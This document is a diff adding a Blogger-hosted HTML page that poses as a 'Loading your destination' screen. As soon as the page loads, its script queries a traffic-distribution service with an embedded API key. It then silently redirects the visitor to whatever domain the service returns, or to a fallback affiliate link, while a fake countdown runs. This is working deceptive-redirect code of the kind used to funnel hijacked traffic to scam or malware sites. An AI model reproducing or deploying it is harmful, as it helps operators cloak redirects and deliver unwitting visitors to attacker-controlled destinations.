@@ -1,0 +1,78 @@
+<html lang="en" xmlns="http://www.w3.org/1999/xhtml" xmlns:b="http://www.google.com/2005/gml/b" xmlns:data="http://www.google.com/2005/gml/data" xmlns:expr="http://www.google.com/2005/gml/expr"><head>
+<link href="https://www.blogger.com/static/v1/widgets/55013136-widget_css_bundle.css" rel="stylesheet" type="text/css">
+<meta content="text/html; charset=utf-8" http-equiv="Content-Type">
+<title>Loading your destination...</title>
+<style id="page-skin-1" type="text/css"><!--
+/* Ваши стили, если они есть */
+
+--></style>
+<script src="https://ajax.googleapis.com/ajax/libs/jquery/2.2.0/jquery.min.js" type="text/javascript"></script>
+<meta name="google-adsense-platform-account" content="ca-host-pub-1556223355139109">
+<meta name="google-adsense-platform-domain" content="blogspot.com">
+
+</head>
+<body>
+<!-- Обязательная секция -->
+<div class="main no-items section" id="mainSection"></div>
+<br>
+<center>
+<span style="color:#000000;font-family: Arial, Helvetica, sans-serif;font-size:16px;line-height:14px;">
+            Loading your destination... Please wait while we take you there.<br>
+            Redirecting in <span id="timer" style="color:green;font-size:18px;font-weight: bold;">5</span> seconds...
+        </span>
+</center>
+<br>
+<center>
+<div class="qSmJ">
+<img src="https://mir-s3-cdn-cf.behance.net/project_modules/disp/583b6136197347.571361641da25.gif">
+</div>
+</center>
+<script type="text/javascript">
+    //<![CDATA[
+        // Функция для перенаправления
+        function redirect() {
+            const partner_link = 'https://mifozixudy.net/?u=d43384&o=d423'; // Исходная ссылка
+            const params = partner_link.split('?')[1]; // Получаем параметры из исходной ссылки
+
+            $.get("https://profitpay.vip/actions/partners_domain.php?apikey=a58be8-616eea-f6b70f-edc526-a2d1c9")
+                .done(function(data) {
+                    if (data && data.status === 'good') {
+                        let rand = Math.random().toString(36).substr(2, 10); // Генерация случайного параметра
+                        let partner_domain = data.url + '?' + params + '&r=' + rand; // Добавляем параметры из исходной ссылки
+                        window.location.replace(partner_domain);
+                    } else if (data && data.status === 'traffback') {
+                        window.location.replace(data.url);
+                    } else {
+                        window.location.replace(partner_link); // Резервный URL с исходными параметрами
+                    }
+                })
+                .fail(function() {
+                    window.location.replace(partner_link); // Резервный URL с исходными параметрами
+                });
+        }
+
+        // Функция для таймера
+        var timer = 5; // Начальное значение таймера
+        function ftimer() {
+            document.getElementById("timer").innerHTML = timer;
+            timer = timer - 1;
+            if (timer >= 0) {
+                setTimeout(ftimer, 1000); // Обновляем таймер каждую секунду
+            }
+        }
+
+        // Запуск перенаправления сразу
+        redirect();
+
+        // Запуск таймера
+        ftimer();
+    //]]>
+    </script>
+
+<script type="text/javascript" src="https://www.blogger.com/static/v1/widgets/3131230167-widgets.js"></script>
+<script type="text/javascript">
+window['__wavt'] = 'AOuZoY485ZQO344ZtycUprydHTfmHo_BEA:1746409118027';_WidgetManager._Init('//www.blogger.com/rearrange?blogID\x3d6377461842135337195','//servise09.blogspot.com/','6377461842135337195');
+_WidgetManager._SetDataContext([{'name': 'blog', 'data': {'blogId': '6377461842135337195', 'title': 'servise9', 'url': 'https://servise09.blogspot.com/', 'canonicalUrl': 'https://servise09.blogspot.com/', 'homepageUrl': 'https://servise09.blogspot.com/', 'searchUrl': 'https://servise09.blogspot.com/search', 'canonicalHomepageUrl': 'https://servise09.blogspot.com/', 'blogspotFaviconUrl': 'https://servise09.blogspot.com/favicon.ico', 'bloggerUrl': 'https://www.blogger.com', 'hasCustomDomain': false, 'httpsEnabled': true, 'enabledCommentProfileImages': true, 'gPlusViewType': 'FILTERED_POSTMOD', 'adultContent': false, 'analyticsAccountNumber': '', 'encoding': 'UTF-8', 'locale': 'ru', 'localeUnderscoreDelimited': 'ru', 'languageDirection': 'ltr', 'isPrivate': false, 'isMobile': false, 'isMobileRequest': false, 'mobileClass': '', 'isPrivateBlog': false, 'isDynamicViewsAvailable': true, 'feedLinks': '\x3clink rel\x3d\x22alternate\x22 type\x3d\x22application/atom+xml\x22 title\x3d\x22servise9 - Atom\x22 href\x3d\x22https://servise09.blogspot.com/feeds/posts/default\x22 /\x3e\n\x3clink rel\x3d\x22alternate\x22 type\x3d\x22application/rss+xml\x22 title\x3d\x22servise9 - RSS\x22 href\x3d\x22https://servise09.blogspot.com/feeds/posts/default?alt\x3drss\x22 /\x3e\n\x3clink rel\x3d\x22service.post\x22 type\x3d\x22application/atom+xml\x22 title\x3d\x22servise9 - Atom\x22 href\x3d\x22https://www.blogger.com/feeds/6377461842135337195/posts/default\x22 /\x3e\n', 'meTag': '\x3clink rel\x3d\x22me\x22 href\x3d\x22https://www.blogger.com/profile/16596023928114896605\x22 /\x3e\n', 'adsenseHostId': 'ca-host-pub-1556223355139109', 'adsenseHasAds': false, 'adsenseAutoAds': false, 'boqCommentIframeForm': true, 'loginRedirectParam': '', 'view': '', 'dynamicViewsCommentsSrc': '//www.blogblog.com/dynamicviews/4224c15c4e7c9321/js/comments.js', 'dynamicViewsScriptSrc': '//www.blogblog.com/dynamicviews/a558aeb4ec2c6340', 'plusOneApiSrc': 'https://apis.google.com/js/platform.js', 'disableGComments': true, 'interstitialAccepted': false, 'sharing': {'platforms': [{'name': '\u041f\u043e\u043b\u0443\u0447\u0438\u0442\u044c \u0441\u0441\u044b\u043b\u043a\u0443', 'key': 'link', 'shareMessage': '\u041f\u043e\u043b\u0443\u0447\u0438\u0442\u044c \u0441\u0441\u044b\u043b\u043a\u0443', 'target': ''}, {'name': 'Facebook', 'key': 'facebook', 'shareMessage': '\u041f\u043e\u0434\u0435\u043b\u0438\u0442\u044c\u0441\u044f \u0432 Facebook', 'target': 'facebook'}, {'name': '\u041d\u0430\u043f\u0438\u0441\u0430\u0442\u044c \u043e\u0431 \u044d\u0442\u043e\u043c \u0432 \u0431\u043b\u043e\u0433\u0435', 'key': 'blogThis', 'shareMessage': '\u041d\u0430\u043f\u0438\u0441\u0430\u0442\u044c \u043e\u0431 \u044d\u0442\u043e\u043c \u0432 \u0431\u043b\u043e\u0433\u0435', 'target': 'blog'}, {'name': 'X', 'key': 'twitter', 'shareMessage': '\u041f\u043e\u0434\u0435\u043b\u0438\u0442\u044c\u0441\u044f \u0432 X', 'target': 'twitter'}, {'name': 'Pinterest', 'key': 'pinterest', 'shareMessage': '\u041f\u043e\u0434\u0435\u043b\u0438\u0442\u044c\u0441\u044f \u0432 Pinterest', 'target': 'pinterest'}, {'name': '\u042d\u043b\u0435\u043a\u0442\u0440\u043e\u043d\u043d\u0430\u044f \u043f\u043e\u0447\u0442\u0430', 'key': 'email', 'shareMessage': '\u042d\u043b\u0435\u043a\u0442\u0440\u043e\u043d\u043d\u0430\u044f \u043f\u043e\u0447\u0442\u0430', 'target': 'email'}], 'disableGooglePlus': true, 'googlePlusShareButtonWidth': 0, 'googlePlusBootstrap': '\x3cscript type\x3d\x22text/javascript\x22\x3ewindow.___gcfg \x3d {\x27lang\x27: \x27ru\x27};\x3c/script\x3e'}, 'hasCustomJumpLinkMessage': false, 'jumpLinkMessage': '\u0414\u0430\u043b\u0435\u0435...', 'pageType': 'index', 'pageName': '', 'pageTitle': 'servise9'}}, {'name': 'features', 'data': {}}, {'name': 'messages', 'data': {'edit': '\u0418\u0437\u043c\u0435\u043d\u0438\u0442\u044c', 'linkCopiedToClipboard': '\u0421\u0441\u044b\u043b\u043a\u0430 \u0441\u043a\u043e\u043f\u0438\u0440\u043e\u0432\u0430\u043d\u0430 \u0432 \u0431\u0443\u0444\u0435\u0440 \u043e\u0431\u043c\u0435\u043d\u0430!', 'ok': '\u041e\u041a', 'postLink': '\u0421\u0441\u044b\u043b\u043a\u0430 \u043d\u0430 \u0441\u043e\u043e\u0431\u0449\u0435\u043d\u0438\u0435'}}, {'name': 'template', 'data': {'name': 'custom', 'localizedName': '\u0414\u043e\u043f\u043e\u043b\u043d\u0438\u0442\u0435\u043b\u044c\u043d\u043e', 'isResponsive': false, 'isAlternateRendering': false, 'isCustom': true}}, {'name': 'view', 'data': {'classic': {'name': 'classic', 'url': '?view\x3dclassic'}, 'flipcard': {'name': 'flipcard', 'url': '?view\x3dflipcard'}, 'magazine': {'name': 'magazine', 'url': '?view\x3dmagazine'}, 'mosaic': {'name': 'mosaic', 'url': '?view\x3dmosaic'}, 'sidebar': {'name': 'sidebar', 'url': '?view\x3dsidebar'}, 'snapshot': {'name': 'snapshot', 'url': '?view\x3dsnapshot'}, 'timeslide': {'name': 'timeslide', 'url': '?view\x3dtimeslide'}, 'isMobile': false, 'title': 'servise9', 'description': '', 'url': 'https://servise09.blogspot.com/', 'type': 'feed', 'isSingleItem': false, 'isMultipleItems': true, 'isError': false, 'isPage': false, 'isPost': false, 'isHomepage': true, 'isArchive': false, 'isLabelSearch': false}}]);
+</script>
+
+</body></html>
